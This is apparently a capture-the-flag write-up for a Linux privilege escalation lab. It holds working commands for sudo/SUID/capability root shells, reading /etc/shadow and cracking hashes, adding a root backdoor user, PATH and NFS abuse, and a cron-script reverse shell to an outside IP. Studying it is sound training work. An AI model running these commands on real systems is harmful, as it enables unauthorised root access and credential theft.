## Enumeration

```bash
hostname
uname -a
cat /proc/version
cat /etc/*release
ps aux
env
sudo -l
ls -la
id
cat /etc/passwd|grep sh$
history
ifconfig
ip route
netstat -ltnp
w
find / -type f -perm 0777 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

## Privilege Escalation: Kernel Exploits

```bash
searchsploit linux kernel 3.13.0
searchsploit -m 37292
less 37292.c
find / -name flag1.txt -type f
```

## Privilege Escalation: Sudo

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
$ sudo -l
Matching Defaults entries for karen on ip-10-10-237-93:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-237-93:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

`find`, `less`, `nano` can be found in gtfobin

```bash
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation: SUID

list files that have SUID or SGID bits set.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Result:
```bash
...
/usr/bin/base64
...
```

Find it in https://gtfobins.github.io/#+suid

https://gtfobins.github.io/gtfobins/base64/

Read shadow file

```bash
base64 /etc/shadow | base64 -d
```

### Crack unshadowed hash

Do unshadow to make a file crackable by john

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

```bash
john passwords.txt --wordlist=/opt/wordlists/rockyou.txt
```

### Add new user in /etc/shadow

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

```bash
openssl passwd -1 -salt THM 321
```

Add the line to `/etc/shadow`

```bash
hacker:$1$THM$3Aq6va4C7LDoWkD95QXUI0:0:0:root:/root:/bin/bash
```

Switch to the backdoor user on target

```bash
su hacker
```

### Answers

**Which user shares the name of a great comic book writer?**

```bash
karen@ip-10-10-216-254:/$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
karen:x:1003:1003::/home/karen:/bin/sh
```

> gerryconway

**What is the password of user2?**

> Password1

**What is the content of the flag3.txt file?**

```bash
gerryconway@ip-10-10-216-254:/$ find / -type f -name flag3.txt 2>/dev/null
/home/ubuntu/flag3.txt
gerryconway@ip-10-10-216-254:/$ base64 /home/ubuntu/flag3.txt | base64 -d
THM-3847834
```

## Privilege Escalation: Capabilities

```bash
getcap -r / 2>/dev/null
```

Result:

```bash
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

Search in https://gtfobins.github.io/#+capabilities

https://gtfobins.github.io/gtfobins/vim/#capabilities

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Privilege Escalation: Cron Jobs

```bash
cat /etc/contab
```

Result:

```bash
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

Tamper the shell script

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.11.19.145/1111 0>&1' > /home/karen/backup.sh
```

## Privilege Escalation: PATH

```bash
karen@ip-10-10-230-253:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

**Checklist:**
1.  What folders are located under $PATH
2.  Does your current user have write privileges for any of these folders?
3.  Can you modify $PATH?
4.  Is there a script/application you can start that will be affected by this vulnerability?

**Find if the sub dir under usr is writeable**

```bash
 find / -writable 2>/dev/null| grep usr | cut -d "/" -f 2,3 | sort -u
```

**Path Injection**

Found a suid bits set file

```bash
karen@ip-10-10-230-253:/home/murdoch$ find / -type f -perm -04000 2>/dev/null
...
/home/murdoch/test
karen@ip-10-10-230-253:/home/murdoch$ ls -la
total 32
drwxrwxrwx 2 root root  4096 Oct 22  2021 .
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
karen@ip-10-10-230-253:/home/murdoch$ ./test
sh: 1: thm: not found
```

Make `thm` available to call

```bash
cd /tmp
mkdir www
cd www
echo '/bin/bash' > thm
chmod +x thm
export PATH=/tmp/www:$PATH
```

Call the script

```bash
karen@ip-10-10-230-253:/home/murdoch$ ./test
root@ip-10-10-230-253:/home/murdoch# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

## Privilege Escalation: NFS

NFS (Network File Sharing) configuration is kept in the `/etc/exports file`. This file is created during the NFS server installation and can usually be read by users.

```bash
cat /etc/exports
```

Result:

```bash
...
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

**Enumerate the target machine from attacker machine**

```bash
showmount -e 10.10.153.128
```

Result:

```bash
Export list for 10.10.153.128:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

Create a dir in `/mnt` then mount the nfs share

```bash
┌──(root㉿kali)-[/mnt/backup/backup]
└─# cd /mnt

┌──(root㉿kali)-[/mnt]
└─# mkdir tmp

┌──(root㉿kali)-[/mnt]
└─# mount -t nfs 10.10.153.128:/tmp /mnt/tmp -o nolock
```

Copy the file that can run bash then give setuid bits

```bash
┌──(root㉿kali)-[/mnt/tmp]
└─# cp /opt/sectools/privesc/suid.c .

┌──(root㉿kali)-[/mnt/tmp]
└─# gcc suid.c -o suid

┌──(root㉿kali)-[/mnt/tmp]
└─# chmod +s suid
```

Run the executable on target machine

```bash
karen@ip-10-10-153-128:/tmp$ ./suid
```

Or just copy `bash` itself (Useful when target does not have `gcc` installed)

```bash
$ cd /tmp
cp /bin/bash .
```

```bash
┌──(kali㉿kali)-[/mnt/tmp]
└─$ sudo chown root ./bash

┌──(kali㉿kali)-[/mnt/tmp]
└─$ sudo chmod +s ./bash
```

```bash
$ ./bash -p
bash-5.0# id
uid=1001(karen) gid=1001(karen) euid=0(root) groups=1001(karen)
```

## Capstone Challenge

###### What is the content of the flag1.txt file?

Use base64 get `shadow` and crack hash -> Get user `missy` password: `Password1`

###### What is the content of the flag2.txt file?

`sudo -l` utilize `find`